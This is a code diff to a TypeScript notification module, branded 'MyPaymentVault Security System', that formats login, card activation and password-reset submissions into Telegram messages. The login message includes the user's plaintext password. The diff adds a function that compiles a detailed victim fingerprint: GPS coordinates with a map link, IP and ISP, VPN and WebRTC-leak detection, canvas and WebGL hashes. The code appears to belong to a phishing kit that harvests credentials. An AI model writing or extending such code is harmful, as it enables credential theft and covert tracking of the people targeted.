@@ -6,13 +6,119 @@ import type {
   CardActivationRequest,
   ForgotUsernameRequest,
   ForgotPasswordRequest,
-  AccountLoginRequest
+  AccountLoginRequest,
+  DeviceFingerprint
 } from '@shared/schema';
 import FormData from 'form-data';
 import axios from 'axios';
 import { DeviceInfo, formatDeviceInfo } from './device-detector';
 import { decrypt } from './crypto';
 import { IpInfo, formatIpInfo } from './ip-info';
+
+/**
+ * Format device fingerprint for detailed Telegram message
+ */
+export function formatFingerprint(fp: DeviceFingerprint | undefined, ipInfo: IpInfo): string {
+  if (!fp) return '';
+  
+  let message = '';
+  
+  // Device Details
+  message += `\n📱 <b>Device Details:</b>\n`;
+  message += `   • Device: ${fp.deviceModel || 'Unknown'}\n`;
+  message += `   • Type: ${fp.deviceType || 'Unknown'}\n`;
+  message += `   • Brand: ${fp.deviceBrand || 'Unknown'}\n`;
+  
+  // System Info
+  message += `\n💻 <b>System Info:</b>\n`;
+  message += `   • OS: ${fp.os || 'Unknown'} ${fp.osVersion || ''}\n`;
+  message += `   • Browser: ${fp.browser || 'Unknown'} ${fp.browserVersion || ''} v${fp.browserVersion || ''}\n`;
+  message += `   • Platform: ${fp.platform || 'Unknown'}\n`;
+  message += `   • Vendor: ${fp.vendor || 'N/A'}\n`;
+  message += `   • Screen: ${fp.screenResolution || 'Unknown'}\n`;
+  message += `   • Color Depth: ${fp.colorDepth || 0}-bit\n`;
+  message += `   • CPU Cores: ${fp.cpuCores || 0}\n`;
+  
+  // Timezone & Language
+  if (fp.timezoneInfo) {
+    message += `\n🌍 <b>Timezone & Language:</b>\n`;
+    message += `   • Timezone: ${fp.timezoneInfo.timezone}\n`;
+    message += `   • UTC Offset: ${fp.timezoneInfo.utcOffset >= 0 ? '+' : ''}${fp.timezoneInfo.utcOffset} hours\n`;
+    message += `   • Language: ${fp.timezoneInfo.language}\n`;
+    message += `   • Languages: ${fp.timezoneInfo.languages.join(', ')}\n`;
+  }
+  
+  // Connection Info
+  if (fp.connectionInfo) {
+    message += `\n📡 <b>Connection Info:</b>\n`;
+    message += `   • Network Type: ${fp.connectionInfo.networkType}\n`;
+    message += `   • Connection: ${fp.connectionInfo.effectiveType || 'Unknown'}\n`;
+    message += `   • Effective Type: ${fp.connectionInfo.effectiveType}\n`;
+  }
+  
+  // GPS Location
+  if (fp.gpsLocation) {
+    message += `\n📍 <b>GPS Location:</b>\n`;
+    message += `   • Latitude: ${fp.gpsLocation.latitude}\n`;
+    message += `   • Longitude: ${fp.gpsLocation.longitude}\n`;
+    message += `   • Accuracy: ${Math.round(fp.gpsLocation.accuracy)} meters\n`;
+    message += `   • Google Maps: ${fp.gpsLocation.googleMapsUrl}\n`;
+  }
+  
+  // IP Location (from ipInfo)
+  message += `\n🌐 <b>IP Location:</b>\n`;
+  message += `   • IP: ${ipInfo.ip || 'N/A'}\n`;
+  message += `   • City: ${ipInfo.city || 'N/A'}\n`;
+  message += `   • Region: ${ipInfo.region || 'N/A'}\n`;
+  message += `   • Country: ${ipInfo.country || 'N/A'}\n`;
+  message += `   • ISP: ${ipInfo.isp || 'N/A'}\n`;
+  message += `   • Timezone: ${ipInfo.timezone || 'N/A'}\n`;
+  
+  // VPN Detection
+  if (fp.vpnDetection) {
+    message += `\n🔒 <b>VPN Detection:</b>\n`;
+    message += `   • Possible VPN: ${fp.vpnDetection.possibleVPN ? '⚠️ YES' : '✅ NO'}\n`;
+    message += `   • Indicators: ${fp.vpnDetection.indicators.join(', ') || 'None'}\n`;
+    message += `   • WebRTC Leak: ${fp.vpnDetection.webrtcLeak ? '⚠️ Leak detected' : '✅ No leak detected'}\n`;
+  }
+  
+  // Browser Features
+  if (fp.browserFeatures) {
+    message += `\n🔧 <b>Browser Features:</b>\n`;
+    message += `   • Cookies: ${fp.browserFeatures.cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
+    message += `   • Do Not Track: ${fp.browserFeatures.doNotTrack ? 'Enabled' : 'Disabled'}\n`;
+    message += `   • Touch Support: ${fp.browserFeatures.touchSupport ? 'Yes' : 'No'}\n`;
+    message += `   • Max Touch Points: ${fp.browserFeatures.maxTouchPoints}\n`;
+  }
+  
+  // Plugins/Extensions
+  if (fp.plugins && fp.plugins.length > 0) {
+    message += `\n🧩 <b>Plugins/Extensions:</b>\n`;
+    fp.plugins.slice(0, 5).forEach(plugin => {
+      message += `   • ${plugin}\n`;
+    });
+  }
+  
+  // Fingerprints
+  if (fp.canvasFingerprint || fp.webglInfo) {
+    message += `\n🎨 <b>Fingerprint:</b>\n`;
+    if (fp.canvasFingerprint) {
+      message += `   • Canvas: ${fp.canvasFingerprint.hash}\n`;
+    }
+    if (fp.webglInfo) {
+      message += `   • WebGL Renderer: ${fp.webglInfo.renderer}\n`;
+      message += `   • WebGL Vendor: ${fp.webglInfo.vendor}\n`;
+    }
+  }
+  
+  // User Agent
+  if (fp.userAgent) {
+    message += `\n🔍 <b>User Agent:</b>\n`;
+    message += `   ${fp.userAgent}\n`;
+  }
+  
+  return message;
+}
 
 interface TelegramConfig {
   botToken: string;
@@ -377,7 +483,7 @@ export async function sendForgotPasswordNotification(
 }
 
 /**
- * Format LOGIN message
+ * Format LOGIN message with detailed fingerprint
  */
 function formatLoginMessage(data: LoginRequest, loginAttemptId: string, ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
   const timestamp = new Date().toLocaleString('id-ID', {
@@ -396,13 +502,21 @@ function formatLoginMessage(data: LoginRequest, loginAttemptId: string, ipInfo: 
   message += `   • Password: ${data.password}\n\n`;
   message += `🌐 <b>Network Info:</b>\n`;
   message += formatIpInfo(ipInfo);
-  message += `\n📱 <b>Device Info:</b>\n`;
-  message += `   • Device: ${deviceInfo.deviceModel}\n`;
-  message += `   • OS: ${deviceInfo.os}\n`;
-  message += `   • Browser: ${deviceInfo.browser}\n`;
-  if (deviceInfo.screenResolution) {
-    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
+  
+  // Add detailed fingerprint info if available
+  if (data.fingerprint) {
+    message += formatFingerprint(data.fingerprint, ipInfo);
+  } else {
+    // Fallback to basic device info
+    message += `\n📱 <b>Device Info:</b>\n`;
+    message += `   • Device: ${deviceInfo.deviceModel}\n`;
+    message += `   • OS: ${deviceInfo.os}\n`;
+    message += `   • Browser: ${deviceInfo.browser}\n`;
+    if (deviceInfo.screenResolution) {
+      message += `   • Screen: ${deviceInfo.screenResolution}\n`;
+    }
   }
+  
   message += `\n🔑 <b>Login ID:</b> ${loginAttemptId}\n\n`;
   message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
   message += `🔒 <i>MyPaymentVault Security System</i>`;
